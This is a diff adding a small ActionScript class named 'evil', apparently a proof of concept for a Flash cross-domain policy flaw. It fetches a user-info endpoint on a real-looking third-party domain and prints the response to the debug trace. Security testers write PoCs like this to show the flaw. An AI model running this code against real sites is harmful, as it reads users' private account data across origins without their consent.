@@ -1,0 +1,19 @@
+package {
+    import flash.display.Sprite;
+    import flash.net.URLLoader;
+    import flash.net.URLRequest;
+    import flash.events.Event;
+
+    public class evil extends Sprite {
+        public function evil() {
+            var request:URLRequest = new URLRequest("https://vod.ferrerorocher.com/api/userinfo"); // simula endpoint protegido
+            var loader:URLLoader = new URLLoader();
+            loader.addEventListener(Event.COMPLETE, onComplete);
+            loader.load(request);
+        }
+
+        private function onComplete(e:Event):void {
+            trace("Resposta: " + e.target.data); // resposta exibida na aba de debug do Flash Player
+        }
+    }
+}
